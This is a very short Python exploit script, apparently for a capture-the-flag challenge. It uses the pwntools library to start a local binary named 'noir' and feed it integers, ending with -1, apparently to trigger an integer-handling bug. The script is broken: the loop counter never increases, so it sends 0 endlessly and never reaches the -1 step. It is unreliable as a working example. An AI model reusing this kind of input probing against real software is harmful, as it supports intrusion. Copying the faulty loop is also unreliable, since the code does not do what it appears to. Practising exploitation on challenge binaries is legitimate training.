from pwn import *

elf = ELF('noir', checksec=False)

p = elf.process()
i=0
while i<=1000:
    p.sendline('%d' % i)
    if i == 1000:
        p.sendline('%d' % -1)
